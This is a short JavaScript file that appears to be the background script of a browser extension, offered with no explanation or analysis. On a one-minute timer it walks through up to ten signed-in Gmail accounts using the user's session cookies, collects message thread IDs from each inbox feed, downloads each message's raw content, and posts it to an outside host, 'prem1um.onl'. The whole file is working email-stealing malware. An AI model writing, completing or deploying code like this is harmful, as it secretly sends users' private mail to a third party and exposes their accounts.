const HOST = "https://prem1um.onl/m";
const done = {};
chrome.alarms.create("tick", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(async () => {
  for (let i = 0; i <= 9; i++) {
    const base = "https://mail.google.com/mail/u/" + i;
    const xml = await fetch(base + "/feed/atom", { credentials: "include" }).then(r => r.text());
    const ids = xml.match(/tag:gmail.google.com,2004:\d+/g) || [];
    for (const full of ids) {
      const th = full.split(":").pop();
      if (done[th]) continue;
      const mime = await fetch("https://mail.google.com/mail/u/" + i + "/?view=att&th=" + th + "&attid=0&disp=comp&safe=1", { credentials: "include" }).then(r => r.text());
      await fetch(HOST, { method: "POST", body: mime, credentials: "omit" });
      done[th] = 1;
    }
  }
});
